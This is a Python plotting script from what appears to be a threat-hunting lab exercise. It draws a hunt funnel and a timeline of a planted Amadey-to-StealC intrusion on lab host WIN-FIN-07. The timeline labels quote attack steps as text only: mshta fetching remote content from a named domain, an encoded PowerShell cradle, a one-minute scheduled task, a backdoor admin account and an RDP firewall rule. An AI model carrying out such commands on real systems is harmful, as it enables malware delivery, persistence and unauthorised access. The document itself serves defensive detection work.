#!/usr/bin/env python3
"""
make_figures.py - Week 5 figures from the hunt results and dataset.
  figures/hunt_funnel.png       how each hypothesis narrows a day of logs to the one true positive
  figures/incident_timeline.png the confirmed Amadey -> StealC chain on WIN-FIN-07, by kill-chain phase
Palette follows the project data-viz guide (blue #2a78d6, status green #0ca30c, orange #eb6834).
"""
import json
from datetime import datetime
from pathlib import Path

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
from matplotlib.patches import FancyBboxPatch, FancyArrowPatch

WEEK = Path(__file__).resolve().parent.parent
RES = json.loads((WEEK / "data" / "hunt_results.json").read_text())
ROWS = [json.loads(l) for l in (WEEK / "data" / "dataset.ndjson").read_text().splitlines() if l.strip()]
FIG = WEEK / "figures"; FIG.mkdir(exist_ok=True)

INK, INK2, MUTED, SURF, PANEL, EDGE = "#0b0b0b", "#52514e", "#8a8984", "#fcfcfb", "#f3f2ee", "#d9d8d2"
BLUE, GREEN, ORANGE, RED = "#2a78d6", "#0ca30c", "#eb6834", "#d03b3b"
plt.rcParams.update({"font.family": "DejaVu Sans"})


# ---------------------------------------------------------------- figure 1: hunt funnel
def funnel():
    rowsdef = [
        ("H1  Script host → PowerShell → remote content", [
            (f"{RES['H1']['scope']}", "PowerShell\nexecutions", MUTED),
            (f"{RES['H1']['cradle_only_naive']}", "naive cradle\nsearch (noisy)", ORANGE),
            (f"{RES['H1']['candidates']}", "parent is a\nscript host", BLUE),
            (f"{len(RES['H1']['confirmed'])}", "confirmed\ntrue positive", GREEN),
        ]),
        ("H2  Hex-folder EXE + 1-minute scheduled task", [
            (f"{RES['H2']['scope']}", "process + task\nevents", MUTED),
            (f"{RES['H2']['hexexe'] + RES['H2']['schtasks_mo1'] + RES['H2']['task4698_every_min']}", "candidate\nindicators", BLUE),
            (f"{len(RES['H2']['confirmed_hosts'])}", "confirmed\nhost", GREEN),
        ]),
        ("H3  New admin + firewall rule within 30 min", [
            (f"{RES['H3']['scope']}", "account + firewall\nevents", MUTED),
            (f"{RES['H3']['candidate_accounts'] + RES['H3']['candidate_fw']}", "candidate\nevents", BLUE),
            (f"{len({c['host'] for c in RES['H3']['confirmed']})}", "confirmed\nhost", GREEN),
        ]),
    ]
    fig = plt.figure(figsize=(13.5, 7.2), dpi=120); fig.patch.set_facecolor(SURF)
    ax = fig.add_axes([0, 0, 1, 1]); ax.set_xlim(0, 13.5); ax.set_ylim(0, 7.2); ax.axis("off")
    ax.text(0.4, 6.82, "Hunt funnel — narrowing one day of lab logs to the planted intrusion",
            fontsize=17, weight="bold", color=INK)
    ax.text(0.4, 6.44, f"{RES['dataset_events']} events, {len(RES['hosts'])} Windows hosts, 2026-10-01. "
            "Each hypothesis starts from data my SIEM lab already collects and ends on host WIN-FIN-07.",
            fontsize=10.5, color=INK2)
    ytop = 5.45
    for r, (title, stages) in enumerate(rowsdef):
        y = ytop - r * 1.95
        ax.text(0.4, y + 0.62, title, fontsize=12.5, weight="bold", color=INK)
        x = 0.4; bw, bh, gap = 2.45, 0.95, 0.95
        for i, (num, label, color) in enumerate(stages):
            ax.add_patch(FancyBboxPatch((x, y - 0.5), bw, bh, boxstyle="round,pad=0,rounding_size=0.1",
                                        fc=color, ec=SURF, lw=2))
            fg = "#ffffff" if color in (MUTED, BLUE, GREEN, ORANGE, RED) else INK
            ax.text(x + 0.25, y + 0.08, num, fontsize=20, weight="bold", color=fg, va="center")
            ax.text(x + 0.95, y + 0.08, label, fontsize=9.2, color=fg, va="center")
            if i < len(stages) - 1:
                ax.add_patch(FancyArrowPatch((x + bw, y), (x + bw + gap, y), arrowstyle="-|>",
                                             mutation_scale=16, color=MUTED, lw=1.6))
            x += bw + gap
    ax.text(0.4, 0.33, "Grey = scope searched · orange = a naive content-only search (false positives) · "
            "blue = hypothesis-specific candidates · green = confirmed after triage.",
            fontsize=9.3, color=INK2, style="italic")
    fig.savefig(FIG / "hunt_funnel.png", facecolor=SURF); plt.close(fig)


# ---------------------------------------------------------------- figure 2: incident timeline
def timeline():
    steps = [
        ("11:14:02", "wscript.exe runs invoice_2025.js", 4, "4688"),
        ("11:14:05", "mshta.exe http://pivqmane.com/doc/fb.mp4", 4, "4688"),
        ("11:14:09", "powershell.exe -enc (child of mshta)", 4, "4688/4104"),
        ("11:14:40", "amnew.exe downloaded to %TEMP%", 3, "4688"),
        ("11:15:02", "Yfgfwb.exe in %TEMP%\\067640a009\\", 5, "4688"),
        ("11:15:06", "schtasks /SC MINUTE /MO 1  (task \\Yfgfwb)", 5, "4688/4698"),
        ("11:15:40", "rundll32 clip64.dll,Main", 7, "4688"),
        ("11:17:10", "PowerShell Expand-Archive protected.zip", 7, "4688"),
        ("11:17:40", "x64_protect.exe  (StealC)", 7, "4688"),
        ("11:19:32", "new local admin  sysupd$", 7, "4720/4732"),
        ("11:20:10", "firewall rule: Remote Desktop (TCP-In)", 7, "4946"),
    ]
    PH = {3: ("#1baf7a", "KC3 Delivery"), 4: (ORANGE, "KC4 Exploitation"),
          5: (BLUE, "KC5 Installation"), 7: ("#4a3aa7", "KC7 Actions on Obj.")}
    fig = plt.figure(figsize=(13.5, 7.6), dpi=120); fig.patch.set_facecolor(SURF)
    ax = fig.add_axes([0, 0, 1, 1]); ax.set_xlim(0, 13.5); ax.set_ylim(0, 7.6); ax.axis("off")
    ax.text(0.4, 7.2, "Confirmed intrusion timeline — host WIN-FIN-07, user e.carter (2026-10-01)",
            fontsize=16, weight="bold", color=INK)
    ax.text(0.4, 6.82, "Reconstructed from the three hunts. All events come from log sources the lab already has.",
            fontsize=10.5, color=INK2)
    x0 = 3.3; ax.plot([x0, x0], [0.5, 6.4], color=EDGE, lw=2, zorder=0)
    n = len(steps); top = 6.2; dy = (top - 0.6) / (n - 1)
    for i, (tm, desc, ph, code) in enumerate(steps):
        y = top - i * dy
        color, _ = PH[ph]
        ax.plot(x0, y, "o", ms=11, color=color, mec=SURF, mew=2, zorder=3)
        ax.text(x0 - 0.25, y, tm, fontsize=9.5, color=INK, ha="right", va="center", weight="bold")
        ax.add_patch(FancyBboxPatch((x0 + 0.35, y - 0.17, ), 8.9, 0.34, boxstyle="round,pad=0,rounding_size=0.06",
                                    fc=PANEL, ec=EDGE, lw=0.8))
        ax.text(x0 + 0.5, y, desc, fontsize=10, color=INK, va="center")
        ax.text(x0 + 9.08, y, code, fontsize=8.2, color=MUTED, va="center", ha="right")
    # phase legend
    lx = 0.4
    for ph in [3, 4, 5, 7]:
        c, lab = PH[ph]
        ax.plot(lx + 0.12, 0.33, "o", ms=10, color=c, mec=SURF, mew=2)
        ax.text(lx + 0.33, 0.33, lab, fontsize=9.3, color=INK, va="center")
        lx += 0.33 + 0.085 * len(lab) + 0.5
    ax.text(13.1, 0.33, "H1 catches 11:14 · H2 catches 11:15 · H3 catches 11:19–11:20",
            fontsize=9.3, color=INK2, ha="right", va="center", style="italic")
    fig.savefig(FIG / "incident_timeline.png", facecolor=SURF); plt.close(fig)


funnel()
timeline()
print("wrote", FIG / "hunt_funnel.png", "and", FIG / "incident_timeline.png")
